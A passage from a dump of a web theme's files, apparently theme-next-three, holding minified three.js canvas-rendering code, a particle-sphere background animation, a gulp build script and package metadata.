W=x[O];if(void 0!==(T=!0==w?H.materials[W.materialIndex]:s.material)){var P=T.side,k=le[W.a],N=le[W.b],F=le[W.c];if(!1!==xe.checkTriangleVisibility(k,N,F)){var A=xe.checkBackfaceCulling(k,N,F);if(P!==THREE.DoubleSide){if(P===THREE.FrontSide&&!1===A)continue;if(P===THREE.BackSide&&!0===A)continue}(_=Te()).id=s.id,_.v1.copy(k),_.v2.copy(N),_.v3.copy(F),_.normalModel.copy(W.normal),!1!==A||P!==THREE.BackSide&&P!==THREE.DoubleSide||_.normalModel.negate(),_.normalModel.applyMatrix3(ue).normalize();for(var I=W.vertexNormals,D=0,G=Math.min(I.length,3);D<G;D++){var U=_.vertexNormalsModel[D];U.copy(I[D]),!1!==A||P!==THREE.BackSide&&P!==THREE.DoubleSide||U.negate(),U.applyMatrix3(ue).normalize()}_.vertexNormalsLength=I.length;var q=y[O];if(void 0!==q)for(var X=0;X<3;X++)_.uvs[X].copy(q[X]);_.color=W.color,_.material=T,_.z=(k.positionScreen.z+N.positionScreen.z+F.positionScreen.z)/3,_.renderOrder=s.renderOrder,ce.elements.push(_)}}}}}else if(s instanceof THREE.Line){if(l instanceof THREE.BufferGeometry){if(void 0!==(c=l.attributes).position){var J;for(E=0,d=(J=c.position.array).length;E<d;E+=3)xe.pushVertex(J[E],J[E+1],J[E+2]);if(null!==l.index)for(E=0,d=(u=l.index.array).length;E<d;E+=2)xe.pushLine(u[E],u[E+1]);else{var Y=s instanceof THREE.LineSegments?2:1;for(E=0,d=J.length/3-1;E<d;E+=Y)xe.pushLine(E,E+1)}}}else if(l instanceof THREE.Geometry){if(fe.multiplyMatrices(he,oe),0===(R=s.geometry.vertices).length)continue;(k=ye()).positionScreen.copy(R[0]).applyMatrix4(fe);for(Y=s instanceof THREE.LineSegments?2:1,g=1,S=R.length;g<S;g++)(k=ye()).positionScreen.copy(R[g]).applyMatrix4(fe),0<(g+1)%Y||(N=le[Z-2],ve.copy(k.positionScreen),Re.copy(N.positionScreen),!0===Se(ve,Re)&&(ve.multiplyScalar(1/ve.w),Re.multiplyScalar(1/Re.w),(te=we()).id=s.id,te.v1.positionScreen.copy(ve),te.v2.positionScreen.copy(Re),te.z=Math.max(ve.z,Re.z),te.renderOrder=s.renderOrder,te.material=s.material,s.material.vertexColors===THREE.VertexColors&&(te.vertexColors[0].copy(s.geometry.colors[g]),te.vertexColors[1].copy(s.geometry.colors[g-1])),ce.elements.push(te)))}}else if(s instanceof THREE.Sprite){Ee.set(oe.elements[12],oe.elements[13],oe.elements[14],1),Ee.applyMatrix4(he);var $=1/Ee.w;Ee.z*=$,-1<=Ee.z&&Ee.z<=1&&((ie=He()).id=s.id,ie.x=Ee.x*$,ie.y=Ee.y*$,ie.z=Ee.z,ie.renderOrder=s.renderOrder,ie.object=s,ie.rotation=s.rotation,ie.scale.x=s.scale.x*Math.abs(ie.x-(Ee.x+t.projectionMatrix.elements[0])/(Ee.w+t.projectionMatrix.elements[12])),ie.scale.y=s.scale.y*Math.abs(ie.y-(Ee.y+t.projectionMatrix.elements[5])/(Ee.w+t.projectionMatrix.elements[13])),ie.material=s.material,ce.elements.push(ie))}}return!0===i&&ce.elements.sort(ge),ce}};\n(function(){var c,p,E,d=window.innerWidth,h=window.innerHeight,t=0,r=0,i=window.innerWidth/2,n=window.innerHeight/2;function f(){i=window.innerWidth/2,n=window.innerHeight/2,c.aspect=window.innerWidth/window.innerHeight,c.updateProjectionMatrix(),E.setSize(window.innerWidth,window.innerHeight)}function u(e){t=e.clientX-i,r=e.clientY-n}function m(e){1<e.touches.length&&(t=e.touches[0].pageX-i)}function v(e){1==e.touches.length&&(t=e.touches[0].pageX-i)}function o(){c.position.x+=.05*(t-c.position.x),c.position.y+=.05*(200-r-c.position.y),c.lookAt(p.position),E.render(p,c)}!function(){var e,t;(e=document.createElement(\"div\")).style.position=\"fixed\",e.style.top=\"0px\",e.style.left=\"0px\",e.style.zIndex=\"-1\",e.style.opacity=\"0.5\",document.body.appendChild(e),(c=new THREE.PerspectiveCamera(75,d/h,1,1e4)).position.z=1e3,p=new THREE.Scene,(E=new THREE.CanvasRenderer({alpha:!0})).setPixelRatio(window.devicePixelRatio),E.setSize(d,h),e.appendChild(E.domElement);for(var r=2*Math.PI,i=new THREE.SpriteCanvasMaterial({color:10263708,program:function(e){e.beginPath(),e.arc(0,0,.5,0,r,!0),e.fill()}}),n=0;n<1e3;n++)(t=new THREE.Sprite(i)).position.x=2*Math.random()-1,t.position.y=2*Math.random()-1,t.position.z=2*Math.random()-1,t.position.normalize(),t.position.multiplyScalar(10*Math.random()+450),t.scale.multiplyScalar(2),p.add(t);for(n=0;n<300;n++){var o=new THREE.Geometry,a=new THREE.Vector3(2*Math.random()-1,2*Math.random()-1,2*Math.random()-1);a.normalize(),a.multiplyScalar(450),o.vertices.push(a);var s=a.clone();s.multiplyScalar(.3*Math.random()+1),o.vertices.push(s);var l=new THREE.Line(o,new THREE.LineBasicMaterial({color:10263708,opacity:Math.random()}));p.add(l)}document.addEventListener(\"mousemove\",u,!1),document.addEventListener(\"touchstart\",m,!1),document.addEventListener(\"touchmove\",v,!1),window.addEventListener(\"resize\",f,!1)}(),function e(){requestAnimationFrame(e);o()}()})();\n"},{"url":"/lib/three/gulpfile.js","content":"const fs = require('fs')\nconst del = require('del')\nconst gulp = require('gulp')\nconst concat = require('gulp-concat')\nconst uglify = require('gulp-uglify')\n\ngulp.task('clean', async () => {\n  del(['*.min.js', '!three.min.js'])\n})\n\ngulp.task('scripts', async () => {\n  const sourceFiles = fs.readdirSync('src')\n  sourceFiles.forEach(file => {\n    const fileName = file.split('.')[0]\n    return gulp.src([`src/${fileName}.js`, 'lib/*.js'])\n      .pipe(concat(`${fileName}.min.js`))\n      .pipe(uglify())\n      .pipe(gulp.dest('./'))\n  })\n})\n\ngulp.task('default', gulp.series('clean', 'scripts'))"},{"url":"/lib/three/package.json","content":"{\n  \"name\": \"theme-next-three\",\n  \"version\": \"1.0.0\",\n  \"main\": \"index.js\",\n  \"repository\": \"git@github.com:theme-next/theme-next-three.git\",\n  \"author\": \"Raincal <cyj94228@gmail.com>\",\n  \"license\": \"MIT\",\n  \"scripts\": {\n    \"build\": \"gulp\"\n  },\n  \"dependencies\": {\n    \"del\": \"^5.1.0\",\n    \"gulp\": \"^4.0.2\",\n    \"gulp-concat\": \"^2.6.1\",\n    \"gulp-uglify\": \"^3.0.2\"\n  }\n}\n"},{"url":"/lib/three/renovate.json","content":"{\n  \"extends\": [\n    \"config:base\"\n  ]\n}\n"},{"url":"/lib/three/three-waves.min.js","content":"THREE.SpriteCanvasMaterial=function(e){THREE.Material.call(this),this.type=\"SpriteCanvasMaterial\",this.color=new THREE.Color(16777215),this.program=function(e,t){},this.setValues(e)},THREE.SpriteCanvasMaterial.prototype=Object.create(THREE.Material.prototype),THREE.SpriteCanvasMaterial.prototype.constructor=THREE.SpriteCanvasMaterial,THREE.SpriteCanvasMaterial.prototype.clone=function(){var e=new THREE.SpriteCanvasMaterial;return e.copy(this),e.color.copy(this.color),e.program=this.program,e},THREE.CanvasRenderer=function(e){console.log(\"THREE.CanvasRenderer\",THREE.REVISION),e=e||{};var s,l,c,p,E,d,f,h,u,m,v,x,R,y,T,w,H,g,S,M=this,b=new THREE.Projector,i=void 0!==e.canvas?e.canvas:document.createElement(\"canvas\"),C=i.width,z=i.height,V=Math.floor(C/2),j=Math.floor(z/2),L=0,O=0,B=C,W=z,n=1,P=i.getContext(\"2d\",{alpha:!0===e.alpha}),r=new THREE.Color(0),o=!0===e.alpha?0:1,a=1,k=0,N=null,F=null,A=null,I=null,D=null,t=[],G=(new THREE.RenderableVertex,new THREE.RenderableVertex,new THREE.Color),U=(new THREE.Color,new THREE.Color,new THREE.Color,new THREE.Color,new THREE.Color),q=new THREE.Color,J=new THREE.Color,X={},$=new THREE.Box2,K=new THREE.Box2,Q=new THREE.Box2,Y=new THREE.Color,Z=new THREE.Color,_=new THREE.Color,ee=new THREE.Vector3,te=new THREE.Vector3,re=new THREE.Vector3,ie=new THREE.Matrix3;function ne(e,t,r){de(r.opacity),fe(r.blending);var i=t.scale.x*V,n=t.scale.y*j,o=.5*Math.sqrt(i*i+n*n);if(Q.min.set(e.x-o,e.y-o),Q.max.set(e.x+o,e.y+o),r instanceof THREE.SpriteMaterial){var a=r.map;if(null!==a){var s=X[a.id];if(void 0!==s&&s.version===a.version||(s=ce(a),X[a.id]=s),void 0!==s.canvas){xe(s.canvas);var l=a.image,c=l.width*a.offset.x,p=l.height*a.offset.y,E=l.width*a.repeat.x,d=l.height*a.repeat.y,f=i/E,h=n/d;P.save(),P.translate(e.x,e.y),0!==r.rotation&&P.rotate(r.rotation),P.translate(-i/2,-n/2),P.scale(f,h),P.translate(-c,-p),P.fillRect(c,p,E,d),P.restore()}}else xe(r.color.getStyle()),P.save(),P.translate(e.x,e.y),0!==r.rotation&&P.rotate(r.rotation),P.scale(i,-n),P.fillRect(-.5,-.5,1,1),P.restore()}else r instanceof THREE.SpriteCanvasMaterial&&(ve(r.color.getStyle()),xe(r.color.getStyle()),P.save(),P.translate(e.x,e.y),0!==r.rotation&&P.rotate(r.rotation),P.scale(i,n),r.program(P),P.restore())}function oe(e,t,r,i){if(de(i.opacity),fe(i.blending),P.beginPath(),P.moveTo(e.positionScreen.x,e.positionScreen.y),P.lineTo(t.positionScreen.x,t.positionScreen.y),i instanceof THREE.LineBasicMaterial){if(he(i.linewidth),ue(i.linecap),me(i.linejoin),i.vertexColors!==THREE.VertexColors)ve(i.color.getStyle());else{var n=r.vertexColors[0].getStyle(),o=r.vertexColors[1].getStyle();if(n===o)ve(n);else{try{var a=P.createLinearGradient(e.positionScreen.x,e.positionScreen.y,t.positionScreen.x,t.positionScreen.y);a.addColorStop(0,n),a.addColorStop(1,o)}catch(e){a=n}ve(a)}}P.stroke(),Q.expandByScalar(2*i.linewidth)}else i instanceof THREE.LineDashedMaterial&&(he(i.linewidth),ue(i.linecap),me(i.linejoin),ve(i.color.getStyle()),Re([i.dashSize,i.gapSize]),P.stroke(),Q.expandByScalar(2*i.linewidth),Re([]))}function ae(e,t,r,i,n,o,a,s){if(M.info.render.vertices+=3,M.info.render.faces++,de(s.opacity),fe(s.blending),f=e.positionScreen.x,h=e.positionScreen.y,u=t.positionScreen.x,m=t.positionScreen.y,v=r.positionScreen.x,x=r.positionScreen.y,function(e,t,r,i,n,o){P.beginPath(),P.moveTo(e,t),P.lineTo(r,i),P.lineTo(n,o),P.closePath()}(f,h,u,m,v,x),(s instanceof THREE.MeshLambertMaterial||s instanceof THREE.MeshPhongMaterial)&&null===s.map)U.copy(s.color),q.copy(s.emissive),s.vertexColors===THREE.FaceColors&&U.multiply(a.color),G.copy(Y),te.copy(e.positionWorld).add(t.positionWorld).add(r.positionWorld).divideScalar(3),function(e,t,r){for(var i=0,n=c.length;i<n;i++){var o=c[i];if(J.copy(o.color),o instanceof THREE.DirectionalLight){var a=ee.setFromMatrixPosition(o.matrixWorld).normalize();if((s=t.dot(a))<=0)continue;s*=o.intensity,r.add(J.multiplyScalar(s))}else if(o instanceof THREE.PointLight){var s;a=ee.setFromMatrixPosition(o.matrixWorld);if((s=t.dot(ee.subVectors(a,e).normalize()))<=0)continue;if(0==(s*=0==o.distance?1:1-Math.min(e.distanceTo(a)/o.distance,1)))continue;s*=o.intensity,r.add(J.multiplyScalar(s))}}}(te,a.normalModel,G),G.multiply(U).add(q),!0===s.wireframe?se(G,s.wireframeLinewidth,s.wireframeLinecap,s.wireframeLinejoin):le(G);else if(s instanceof THREE.MeshBasicMaterial||s instanceof THREE.MeshLambertMaterial||s instanceof THREE.MeshPhongMaterial){if(null!==s.map)s.map.mapping===THREE.UVMapping&&(R=a.uvs,pe(f,h,u,m,v,x,R[i].x,R[i].y,R[n].x,R[n].y,R[o].x,R[o].y,s.map));else null!==s.envMap?s.envMap.mapping===THREE.SphericalReflectionMapping&&(re.copy(a.vertexNormalsModel[i]).applyMatrix3(ie),y=.5*re.x+.5,T=.5*re.y+.5,re.copy(a.vertexNormalsModel[n]).applyMatrix3(ie),w=.5*re.x+.5,H=.5*re.y+.5,re.copy(a.vertexNormalsModel[o]).applyMatrix3(ie),g=.5*re.x+.5,S=.5*re.y+.5,pe(f,h,u,m,v,x,y,T,w,H,g,S,s.envMap)):(G.copy(s.color),s.vertexColors===THREE.FaceColors&&G.multiply(a.color),!0===s.wireframe?se(G,s.wireframeLinewidth,s.wireframeLinecap,s.wireframeLinejoin):le(G))}else s instanceof THREE.MeshNormalMaterial?(re.copy(a.normalModel).applyMatrix3(ie),G.setRGB(re.x,re.y,re.z).multiplyScalar(.5).addScalar(.5)):G.setRGB(1,1,1),!0===s.wireframe?se(G,s.wireframeLinewidth,s.wireframeLinecap,s.wireframeLinejoin):le(G)}function se(e,t,r,i){he(t),ue(r),me(i),ve(e.getStyle()),P.stroke(),Q.expandByScalar(2*t)}function le(e){xe(e.getStyle()),P.fill()}function ce(e){if(0===e.version||e instanceof THREE.CompressedTexture||e instanceof THREE.DataTexture)return{canvas:void 0,version:e.version};var t=e.image;if(!1===t.complete)return{canvas:void 0,version:0};var r=e.wrapS===THREE.RepeatWrapping||e.wrapS===THREE.MirroredRepeatWrapping,i=e.wrapT===THREE.RepeatWrapping||e.wrapT===THREE.MirroredRepeatWrapping,n=e.wrapS===THREE.MirroredRepeatWrapping,o=e.wrapT===THREE.MirroredRepeatWrapping,a=document.createElement(\"canvas\");a.width=t.width*(n?2:1),a.height=t.height*(o?2:1);var s=a.getContext(\"2d\");s.setTransform(1,0,0,-1,0,t.height),s.drawImage(t,0,0),!0==n&&(s.setTransform(-1,0,0,-1,t.width,t.height),s.drawImage(t,-t.width,0)),!0==o&&(s.setTransform(1,0,0,1,0,0),s.drawImage(t,0,t.height)),!0==n&&!0==o&&(s.setTransform(-1,0,0,1,t.width,0),s.drawImage(t,-t.width,t.height));var l=\"no-repeat\";!0==r&&!0==i?l=\"repeat\":!0==r?l=\"repeat-x\":!0==i&&(l=\"repeat-y\");var c=P.createPattern(a,l);return e.onUpdate&&e.onUpdate(e),{canvas:c,version:e.version}}function pe(e,t,r,i,n,o,a,s,l,c,p,E,d){var f=X[d.id];if(void 0!==f&&f.version===d.version||(f=ce(d),X[d.id]=f),void 0===f.canvas)return xe(\"rgba( 0, 0, 0, 1)\"),void P.fill();xe(f.canvas);var h,u,m,v,x,R,y,T,w=d.offset.x/d.repeat.x,H=d.offset.y/d.repeat.y,g=d.image.width*d.repeat.x,S=d.image.height*d.repeat.y;l=(l+w)*g,c=(c+H)*S,p=(p+w)*g,E=(E+H)*S,r-=e,i-=t,n-=e,o-=t,0!=(y=(l-=a=(a+w)*g)*(E-=s=(s+H)*S)-(p-=a)*(c-=s))&&(x=e-(h=(E*r-c*n)*(T=1/y))*a-(m=(l*n-p*r)*T)*s,R=t-(u=(E*i-c*o)*T)*a-(v=(l*o-p*i)*T)*s,P.save(),P.transform(h,u,m,v,x,R),P.fill(),P.restore())}function Ee(e,t,r){var i,n=t.x-e.x,o=t.y-e.y,a=n*n+o*o;0!=a&&(n*=i=r/Math.sqrt(a),o*=i,t.x+=n,t.y+=o,e.x-=n,e.y-=o)}function de(e){a!==e&&(P.globalAlpha=e,a=e)}function fe(e){k!==e&&(e===THREE.NormalBlending?P.globalCompositeOperation=\"source-over\":e===THREE.AdditiveBlending?P.globalCompositeOperation=\"lighter\":e===THREE.SubtractiveBlending?P.globalCompositeOperation=\"darker\":e===THREE.MultiplyBlending&&(P.globalCompositeOperation=\"multiply\"),k=e)}function he(e){A!==e&&(P.lineWidth=e,A=e)}function ue(e){I!==e&&(P.lineCap=e,I=e)}function me(e){D!==e&&(P.lineJoin=e,D=e)}function ve(e){N!==e&&(P.strokeStyle=e,N=e)}function xe(e){F!==e&&(P.fillStyle=e,F=e)}function Re(e){t.length!==e.length&&(P.setLineDash(e),t=e)}void 0===P.setLineDash&&(P.setLineDash=function(){}),this.domElement=i,this.autoClear=!0,this.sortObjects=!0,this.sortElements=!0,this.info={render:{vertices:0,faces:0}},this.supportsVertexTextures=function(){},this.setFaceCulling=function(){},this.getContext=function(){return P},this.getContextAttributes=function(){return P.getContextAttributes()},this.getPixelRatio=function(){return n},this.setPixelRatio=function(e){void 0!==e&&(n=e)},this.setSize=function(e,t,r){C=e*n,z=t*n,i.width=C,i.height=z,V=Math.floor(C/2),j=Math.floor(z/2),!1!==r&&(i.style.width=e+\"px\",i.style.height=t+\"px\"),$.min.set(-V,-j),$.max.set(V,j),K.min.set(-V,-j),K.max.set(V,j),a=1,k=0,D=I=A=F=N=null,this.setViewport(0,0,e,t)},this.setViewport=function(e,t,r,i){L=e*n,O=t*n,B=r*n,W=i*n},this.setScissor=function(){},this.setScissorTest=function(){},this.setClearColor=function(e,t){r.set(e),o=void 0!==t?t:1,K.min.set(-V,-j),K.max.set(V,j)},this.setClearColorHex=function(e,t){console.warn(\"THREE.CanvasRenderer: .setClearColorHex() is being removed. Use .setClearColor() instead.\"),this.setClearColor(e,t)},this.getClearColor=function(){return r},this.getClearAlpha=function(){return o},this.getMaxAnisotropy=function(){return 0},this.clear=function(){!1===K.isEmpty()&&(K.intersect($),K.expandByScalar(2),K.min.x=K.min.x+V,K.min.y=-K.min.y+j,K.max.x=K.max.x+V,K.max.y=-K.max.y+j,o<1&&P.clearRect(0|K.min.x,0|K.max.y,K.max.x-K.min.x|0,K.min.y-K.max.y|0),0<o&&(fe(THREE.NormalBlending),de(1),xe(\"rgba(\"+Math.floor(255*r.r)+\",\"+Math.floor(255*r.g)+\",\"+Math.floor(255*r.b)+\",\"+o+\")\"),P.fillRect(0|K.min.x,0|K.max.y,K.max.x-K.min.x|0,K.min.y-K.max.y|0)),K.makeEmpty())},this.clearColor=function(){},this.clearDepth=function(){},this.clearStencil=function(){},this.render=function(e,t){if(t instanceof THREE.Camera!=!1){var r=e.background;r&&r.isColor?(xe(\"rgb(\"+Math.floor(255*r.r)+\",\"+Math.floor(255*r.g)+\",\"+Math.floor(255*r.b)+\")\"),P.fillRect(0,0,C,z)):!0===this.autoClear&&this.clear(),M.info.render.vertices=0,M.info.render.faces=0,P.setTransform(B/C,0,0,-W/z,L,z-O),P.translate(V,j),s=b.projectScene(e,t,this.sortObjects,this.sortElements),l=s.elements,c=s.lights,t,ie.getNormalMatrix(t.matrixWorldInverse),function(){Y.setRGB(0,0,0),Z.setRGB(0,0,0),_.setRGB(0,0,0);for(var e=0,t=c.length;e<t;e++){var r=c[e],i=r.color;r instanceof THREE.AmbientLight?Y.add(i):r instanceof THREE.DirectionalLight?Z.add(i):r instanceof THREE.PointLight&&_.add(i)}}();for(var i=0,n=l.length;i<n;i++){var o=l[i],a=o.material;if(void 0!==a&&0!==a.opacity){if(Q.makeEmpty(),o instanceof THREE.RenderableSprite)(p=o).x*=V,p.y*=j,ne(p,o,a);else if(o instanceof THREE.RenderableLine)p=o.v1,E=o.v2,p.positionScreen.x*=V,p.positionScreen.y*=j,E.positionScreen.x*=V,E.positionScreen.y*=j,Q.setFromPoints([p.positionScreen,E.positionScreen]),!0===$.intersectsBox(Q)&&oe(p,E,o,a);else if(o instanceof THREE.RenderableFace){if(p=o.v1,E=o.v2,d=o.v3,p.positionScreen.z<-1||1<p.positionScreen.z)continue;if(E.positionScreen.z<-1||1<E.positionScreen.z)continue;if(d.positionScreen.z<-1||1<d.positionScreen.z)continue;p.positionScreen.x*=V,p.positionScreen.y*=j,E.positionScreen.x*=V,E.positionScreen.y*=j,d.positionScreen.x*=V,d.positionScreen.y*=j,0<a.overdraw&&(Ee(p.positionScreen,E.positionScreen,a.overdraw),Ee(E.positionScreen,d.positionScreen,a.overdraw),Ee(d.positionScreen,p.positionScreen,a.overdraw)),Q.setFromPoints([p.positionScreen,E.positionScreen,d.positionScreen]),!0===$.intersectsBox(Q)&&ae(p,E,d,0,1,2,o,a)}K.union(Q)}}P.setTransform(1,0,0,1,0,0)}else console.error(\"THREE.CanvasRenderer.render: camera is not an instance of THREE.Camera.\")}},THREE.RenderableObject=function(){this.id=0,this.object=null,this.z=0,this.renderOrder=0},THREE.RenderableFace=function(){this.id=0,this.v1=new THREE.RenderableVertex,this.v2=new THREE.RenderableVertex,this.v3=new THREE.RenderableVertex,this.normalModel=new THREE.Vector3,this.vertexNormalsModel=[new THREE.Vector3,new THREE.Vector3,new THREE.Vector3],this.vertexNormalsLength=0,this.color=new THREE.Color,this.material=null,this.uvs=[new THREE.Vector2,new THREE.Vector2,new THREE.Vector2],this.z=0,this.renderOrder=0},THREE.RenderableVertex=function(){this.position=new THREE.Vector3,this.positionWorld=new THREE.Vector3,this.positionScreen=new THREE.Vector4,this.visible=!0},THREE.RenderableVertex.prototype.copy=function(e){this.positionWorld.copy(e.positionWorld),this.positionScreen.copy(e.positionScreen)},THREE.RenderableLine=function(){this.id=0,this.v1=new THREE.RenderableVertex,this.v2=new THREE.RenderableVertex,this.vertexColors=[new THREE.Color,new THREE.Color],this.material=null,this.z=0,this.renderOrder=0},THREE.RenderableSprite=function(){this.id=0,this.object=null,this.x=0,this.y=0,this.z=0,this.rotation=0,this.scale=new THREE.Vector2,this.material=null,this.renderOrder=0},THREE.Projector=function(){var Q,Y,n,Z,_,ee,te,re,ie,ne,oe,ae=[],se=0,le=[],t=0,r=[],i=0,o=[],a=0,s=[],l=0,ce={objects:[],lights:[],elements:[]},pe=new THREE.Vector3,Ee=new THREE.Vector4,u=new THREE.Box3(new THREE.Vector3(-1,-1,-1),new THREE.Vector3(1,1,1)),m=new THREE.Box3,v=new Array(3),de=(new Array(4),new THREE.Matrix4),fe=new THREE.Matrix4,he=new THREE.Matrix4,ue=new THREE.Matrix3,me=new THREE.Frustum,ve=new THREE.Vector4,xe=new THREE.Vector4;this.projectVector=function(e,t){console.warn(\"THREE.Projector: .projectVector() is now vector.project().\"),e.project(t)},this.unprojectVector=function(e,t){console.warn(\"THREE.Projector: .unprojectVector() is now vector.unproject().\"),e.unproject(t)},this.pickingRay=function(e,t){console.error(\"THREE.Projector: .pickingRay() is now raycaster.setFromCamera().\")};var Re=new function(){var l=[],c=[],p=null,E=null,d=new THREE.Matrix3;function i(e){var t=e.position,r=e.positionWorld,i=e.positionScreen;r.copy(t).applyMatrix4(oe),i.copy(r).applyMatrix4(fe);var n=1/i.w;i.x*=n,i.y*=n,i.z*=n,e.visible=-1<=i.x&&i.x<=1&&-1<=i.y&&i.y<=1&&-1<=i.z&&i.z<=1}function f(e,t,r){return!0===e.visible||!0===t.visible||!0===r.visible||(v[0]=e.positionScreen,v[1]=t.positionScreen,v[2]=r.positionScreen,u.intersectsBox(m.setFromPoints(v)))}function h(e,t,r){return(r.positionScreen.x-e.positionScreen.x)*(t.positionScreen.y-e.positionScreen.y)-(r.positionScreen.y-e.positionScreen.y)*(t.positionScreen.x-e.positionScreen.x)<0}return{setObject:function(e){E=(p=e).material,d.getNormalMatrix(p.matrixWorld),l.length=0,c.length=0},projectVertex:i,checkTriangleVisibility:f,checkBackfaceCulling:h,pushVertex:function(e,t,r){(n=ye()).position.set(e,t,r),i(n)},pushNormal:function(e,t,r){l.push(e,t,r)},pushUv:function(e,t){c.push(e,t)},pushLine:function(e,t){var r=le[e],i=le[t];(te=we()).id=p.id,te.v1.copy(r),te.v2.copy(i),te.z=(r.positionScreen.z+i.positionScreen.z)/2,te.renderOrder=p.renderOrder,te.material=p.material,ce.elements.push(te)},pushTriangle:function(e,t,r){var i=le[e],n=le[t],o=le[r];if(!1!==f(i,n,o)&&(E.side===THREE.DoubleSide||!0===h(i,n,o))){(_=Te()).id=p.id,_.v1.copy(i),_.v2.copy(n),_.v3.copy(o),_.z=(i.positionScreen.z+n.positionScreen.z+o.positionScreen.z)/3,_.renderOrder=p.renderOrder,_.normalModel.fromArray(l,3*e),_.normalModel.applyMatrix3(d).normalize();for(var a=0;a<3;a++){var s=_.vertexNormalsModel[a];s.fromArray(l,3*arguments[a]),s.applyMatrix3(d).normalize(),_.uvs[a].fromArray(c,2*arguments[a])}_.vertexNormalsLength=3,_.material=p.material,ce.elements.push(_)}}}};function ye(){if(Z!==t)return le[Z++];var e=new THREE.RenderableVertex;return le.push(e),t++,Z++,e}function Te(){if(ee!==i)return r[ee++];var e=new THREE.RenderableFace;return r.push(e),i++,ee++,e}function we(){if(re!==a)return o[re++];var e=new THREE.RenderableLine;return o.push(e),a++,re++,e}function He(){if(ne!==l)return s[ne++];var e=new THREE.RenderableSprite;return s.push(e),l++,ne++,e}function ge(e,t){return e.renderOrder!==t.renderOrder?e.renderOrder-t.renderOrder:e.z!==t.z?t.z-e.z:e.id!==t.id?e.id-t.id:0}function Se(e,t){var r=0,i=1,n=e.z+e.w,o=t.z+t.w,a=-e.z+e.w,s=-t.z+t.w;return 0<=n&&0<=o&&0<=a&&0<=s||!(n<0&&o<0||a<0&&s<0)&&(n<0?r=Math.max(r,n/(n-o)):o<0&&(i=Math.min(i,n/(n-o))),a<0?r=Math.max(r,a/(a-s)):s<0&&(i=Math.min(i,a/(a-s))),!(i<r)&&(e.lerp(t,r),t.lerp(e,1-i),!0))}this.projectScene=function(e,t,r,i){function n(e){(Q=function(){if(Y!==se)return ae[Y++];var e=new THREE.RenderableObject;return ae.push(e),se++,Y++,e}()).id=e.id,Q.object=e,pe.setFromMatrixPosition(e.matrixWorld),pe.applyMatrix4(fe),Q.z=pe.z,Q.renderOrder=e.renderOrder,ce.objects.push(Q)}ne=re=ee=0,!(ce.elements.length=0)===e.autoUpdate&&e.updateMatrixWorld(),null===t.parent&&t.updateMatrixWorld(),de.copy(t.matrixWorldInverse.getInverse(t.matrixWorld)),fe.multiplyMatrices(t.projectionMatrix,de),me.setFromMatrix(fe),Y=0,ce.objects.length=0,ce.lights.length=0,e.traverseVisible(function(e){if(e instanceof THREE.Light)ce.lights.push(e);else if(e instanceof THREE.Mesh||e instanceof THREE.Line){if(!1===e.material.visible)return;if(!0===e.frustumCulled&&!1===me.intersectsObject(e))return;n(e)}else if(e instanceof THREE.Sprite){if(!1===e.material.visible)return;if(!0===e.frustumCulled&&!1===me.intersectsSprite(e))return;n(e)}}),!0===r&&ce.objects.sort(ge);for(var o=0,a=ce.objects.length;o<a;o++){var s=ce.objects[o].object,l=s.geometry;if(Re.setObject(s),oe=s.matrixWorld,Z=0,s instanceof THREE.Mesh){if(l instanceof THREE.BufferGeometry){var c=l.attributes,p=l.groups;if(void 0===c.position)continue;for(var E=0,d=(X=c.position.array).length;E<d;E+=3)Re.pushVertex(X[E],X[E+1],X[E+2]);if(void 0!==c.normal){var f=c.normal.array;for(E=0,d=f.length;E<d;E+=3)Re.pushNormal(f[E],f[E+1],f[E+2])}if(void 0!==c.uv){var h=c.uv.array;for(E=0,d=h.length;E<d;E+=2)Re.pushUv(h[E],h[E+1])}if(null!==l.index){var u=l.index.array;if(0<p.length)for(var m=0;m<p.length;m++){var v=p[m];for(E=v.start,d=v.start+v.count;E<d;E+=3)Re.pushTriangle(u[E],u[E+1],u[E+2])}else for(E=0,d=u.length;E<d;E+=3)Re.pushTriangle(u[E],u[E+1],u[E+2])}else for(E=0,d=X.length/3;E<d;E+=3)Re.pushTriangle(E,E+1,E+2)}else if(l instanceof THREE.Geometry){var x=l.vertices,R=l.faces,y=l.faceVertexUvs[0];ue.getNormalMatrix(oe);for(var T=s.material,w=T instanceof THREE.MultiMaterial,H=!0==w?s.material:null,g=0,S=x.length;g<S;g++){var M=x[g];if(pe.copy(M),!0===T.morphTargets)for(var b=l.morphTargets,C=s.morphTargetInfluences,z=0,V=b.length;z<V;z++){var j=C[z];if(0!==j){var L=b[z].vertices[g];pe.x+=(L.x-M.x)*j,pe.y+=(L.y-M.y)*j,pe.z+=(L.z-M.z)*j}}Re.pushVertex(pe.x,pe.y,pe.z)}for(var O=0,B=R.length;O<B;O++){var W=R[O];if(void 0!==(T=!0==w?H.materials[W.materialIndex]:s.material)){var P=T.side,k=le[W.a],N=le[W.b],F=le[W.c];if(!1!==Re.checkTriangleVisibility(k,N,F)){var A=Re.checkBackfaceCulling(k,N,F);if(P!==THREE.DoubleSide){if(P===THREE.FrontSide&&!1===A)continue;if(P===THREE.BackSide&&!0===A)continue}(_=Te()).id=s.id,_.v1.copy(k),_.v2.copy(N),_.v3.copy(F),_.normalModel.copy(W.normal),!1!==A||P!==THREE.BackSide&&P!==THREE.DoubleSide||_.normalModel.negate(),_.normalModel.applyMatrix3(ue).normalize();for(var I=W.vertexNormals,D=0,G=Math.min(I.length,3);D<G;D++){var U=_.vertexNormalsModel[D];U.copy(I[D]),!1!==A||P!==THREE.BackSide&&P!==THREE.DoubleSide||U.negate(),U.applyMatrix3(ue).normalize()}_.vertexNormalsLength=I.length;var q=y[O];if(void 0!==q)for(var J=0;J<3;J++)_.uvs[J].copy(q[J]);_.color=W.color,_.material=T,_.z=(k.positionScreen.z+N.positionScreen.z+F.positionScreen.z)/3,_.renderOrder=s.renderOrder,ce.elements.push(_)}}}}}else if(s instanceof THREE.Line){if(l instanceof THREE.BufferGeometry){if(void 0!==(c=l.attributes).position){var X;for(E=0,d=(X=c.position.array).length;E<d;E+=3)Re.pushVertex(X[E],X[E+1],X[E+2]);if(null!==l.index)for(E=0,d=(u=l.index.array).length;E<d;E+=2)Re.pushLine(u[E],u[E+1]);else{var $=s instanceof THREE.LineSegments?2:1;for(E=0,d=X.length/3-1;E<d;E+=$)Re.pushLine(E,E+1)}}}else if(l instanceof THREE.Geometry){if(he.multiplyMatrices(fe,oe),0===(x=s.geometry.vertices).length)continue;(k=ye()).positionScreen.copy(x[0]).applyMatrix4(he);for($=s instanceof 